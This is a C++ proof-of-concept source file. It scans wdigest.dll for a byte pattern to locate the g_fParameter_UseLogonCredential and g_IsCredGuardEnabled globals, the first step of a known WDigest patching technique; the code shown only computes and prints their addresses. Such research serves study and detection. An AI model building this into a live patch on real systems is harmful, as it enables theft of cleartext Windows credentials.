#include <iostream>
#include <Windows.h>

#define PATTERN_SIZE 12

typedef struct _WDIGEST_PATCH_POC
{
    PVOID BaseAddress;
    DWORD CodeOffset;
    DWORD UseLogonCredentialOffset;
    DWORD IsCredGuardEnabledOffset;
    DWORD64 UseLogonCredentialAddress;
    DWORD64 IsCredGuardEnabledAddress;

} WDIGEST_PATCH_POC, * PWDIGEST_PATCH_POC;

BOOL FindVariableOffsets(PWDIGEST_PATCH_POC pWdigestStruct);
BOOL FindBaseAddress(PWDIGEST_PATCH_POC pWdigestStruct);
BOOL CalculateVirtualAddresses(PWDIGEST_PATCH_POC pWdigestStruct);

int wmain(int argc, wchar_t* argv[])
{
    WDIGEST_PATCH_POC WdigestStruct;

    ZeroMemory(&WdigestStruct, sizeof(WdigestStruct));
    if (!FindVariableOffsets(&WdigestStruct))
        goto end;

    wprintf(L"Offset of g_fParameter_UseLogonCredential: 0x%08x\r\n", WdigestStruct.UseLogonCredentialOffset);
    wprintf(L"Offset of g_IsCredGuardEnabled: 0x%08x\r\n", WdigestStruct.IsCredGuardEnabledOffset);

    if (!FindBaseAddress(&WdigestStruct))
        goto end;

    wprintf(L"Base address of wdigest.dll: 0x%016p\r\n", WdigestStruct.BaseAddress);

    if (!CalculateVirtualAddresses(&WdigestStruct))
        goto end;

    wprintf(L"Address of g_fParameter_UseLogonCredential: 0x%016llx\r\n", WdigestStruct.UseLogonCredentialAddress);
    wprintf(L"Address of g_IsCredGuardEnabled: 0x%016llx\r\n", WdigestStruct.IsCredGuardEnabledAddress);

end:
    return 0;
}

BOOL FindBaseAddress(PWDIGEST_PATCH_POC pWdigestStruct)
{
    HMODULE hModule = NULL;

    if ((hModule = LoadLibraryW(L"wdigest.dll")))
    {
        pWdigestStruct->BaseAddress = hModule;
        FreeLibrary(hModule);
        return TRUE;
    }

    return FALSE;
}

BOOL FindVariableOffsets(PWDIGEST_PATCH_POC pWdigestStruct)
{
    BOOL bResult = FALSE, bMatch;
    LPCWSTR pwszWdigestName = L"C:\\Windows\\System32\\wdigest.dll";
    HANDLE hFile = NULL;
    PBYTE pBuffer = NULL, pTextSection = NULL;
    IMAGE_DOS_HEADER DosHeader;
    IMAGE_NT_HEADERS NtHeaders;
    IMAGE_SECTION_HEADER SectionHeader;
    DWORD i, j, dwSectionOffset, dwMatchCount = 0, dwCodeOffset, dwUseLogonCredentialOffset, dwIsCredGuardEnabledOffset;
    const DWORD dwBufferSize = 1024;
    BYTE Code[PATTERN_SIZE];

    //
    // Allocate a buffer that we will use to read data from wdigest.dll.
    //
    if (!(pBuffer = (PBYTE)LocalAlloc(LPTR, dwBufferSize)))
        goto cleanup;

    hFile = CreateFileW(pwszWdigestName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto cleanup;

    //
    // Read DOS and NT headers from the PE file. We want to get some information about the PE's
    // sections. We also want to make sure that the PE's architecture is amd64.
    //
    if (!ReadFile(hFile, pBuffer, dwBufferSize, NULL, NULL))
        goto cleanup;

    RtlMoveMemory(&DosHeader, pBuffer, sizeof(DosHeader));
    RtlMoveMemory(&NtHeaders, pBuffer + DosHeader.e_lfanew, sizeof(NtHeaders));

    if (NtHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        wprintf(L"Unsupported architecture: 0x%04x\r\n", NtHeaders.FileHeader.Machine);
        goto cleanup;
    }

    //
    // Iterate the PE's section headers.
    //
    for (i = 0; i < NtHeaders.FileHeader.NumberOfSections; i++)
    {
        dwSectionOffset = DosHeader.e_lfanew + sizeof(NtHeaders) + i * sizeof(SectionHeader);
        SetFilePointer(hFile, dwSectionOffset, NULL, FILE_BEGIN);
        if (!ReadFile(hFile, pBuffer, sizeof(IMAGE_SECTION_HEADER), NULL, NULL))
            break;
        RtlMoveMemory(&SectionHeader, pBuffer, sizeof(SectionHeader));

        //
        // Stop when we reach the .text section.
        //
        if (!strcmp((char*)SectionHeader.Name, ".text"))
        {
            //
            // Store the content of the .text section in a buffer. The size of the buffer to allocate is
            // the size of the section, which is stored in 'SectionHeader.SizeOfRawData'. The offset of
            // the section's data in the file is stored in 'SectionHeader.PointerToRawData'.
            //
            if (!(pTextSection = (PBYTE)LocalAlloc(LPTR, SectionHeader.SizeOfRawData)))
                break;

            SetFilePointer(hFile, SectionHeader.PointerToRawData, NULL, FILE_BEGIN);
            if (!ReadFile(hFile, pTextSection, SectionHeader.SizeOfRawData, NULL, NULL))
                break;

            //
            // Now that we have read the content of the .text section and stored it in memory, we want to
            // search for the following pattern: '39 ?? ?? ?? ?? 00 8b ?? ?? ?? ?? 00'. We won't stop when
            // the first occurrence is matched though. This is a simple safeguard to make sure the pattern
            // matches only one memory location. Once the search is over, we test whether the occurrence 
            // count is exactly 1.
            //
            j = 0;
            while (j < SectionHeader.SizeOfRawData)
            {
                // If the size of the remaining data is lower than the pattern's length, stop.
                if ((j + PATTERN_SIZE) >= SectionHeader.SizeOfRawData)
                    break;

                // If the current byte is 0x39, check if the following bytes match our pattern.
                if (pTextSection[j] == 0x39)
                {
                    bMatch = (pTextSection[j + 5] == 0x00) && (pTextSection[j + 6] == 0x8b) && (pTextSection[j + 11] == 0x00);

                    if (bMatch)
                    {
                        dwCodeOffset = SectionHeader.VirtualAddress + j;
                        RtlMoveMemory(Code, &pTextSection[j], PATTERN_SIZE);
                        dwMatchCount++;
                    }
                }

                j++;
            }

            break;
        }
    }

    if (dwMatchCount != 1)
    {
        wprintf(L"Pattern not matched (or more than once): %d\r\n", dwMatchCount);
        goto cleanup;
    }

    wprintf(L"Matched code at 0x%08x: ", dwCodeOffset);
    for (i = 0; i < sizeof(Code); i++)
        wprintf(L"%02x ", Code[i]);
    wprintf(L"\r\n");

    //
    // Extract the RIP-relative offsets and calculate the absolute offset of each global variable.
    // Finally, populate the structure, set the result to TRUE, clean up and return.
    //
    RtlMoveMemory(&dwUseLogonCredentialOffset, &Code[2], sizeof(dwUseLogonCredentialOffset));
    RtlMoveMemory(&dwIsCredGuardEnabledOffset, &Code[8], sizeof(dwIsCredGuardEnabledOffset));
    dwUseLogonCredentialOffset += 6 + dwCodeOffset;
    dwIsCredGuardEnabledOffset += 6 + 6 + dwCodeOffset;

    pWdigestStruct->CodeOffset = dwCodeOffset;
    pWdigestStruct->UseLogonCredentialOffset = dwUseLogonCredentialOffset;
    pWdigestStruct->IsCredGuardEnabledOffset = dwIsCredGuardEnabledOffset;

    bResult = TRUE;

cleanup:
    if (hFile)
        CloseHandle(hFile);
    if (pBuffer)
        LocalFree(pBuffer);
    if (pTextSection)
        LocalFree(pTextSection);

    return bResult;
}

BOOL CalculateVirtualAddresses(PWDIGEST_PATCH_POC pWdigestStruct)
{
    if (!pWdigestStruct || !pWdigestStruct->BaseAddress || !pWdigestStruct->UseLogonCredentialOffset || !pWdigestStruct->IsCredGuardEnabledOffset)
        return FALSE;

    pWdigestStruct->UseLogonCredentialAddress = (DWORD64)pWdigestStruct->BaseAddress + pWdigestStruct->UseLogonCredentialOffset;
    pWdigestStruct->IsCredGuardEnabledAddress = (DWORD64)pWdigestStruct->BaseAddress + pWdigestStruct->IsCredGuardEnabledOffset;

    return TRUE;
}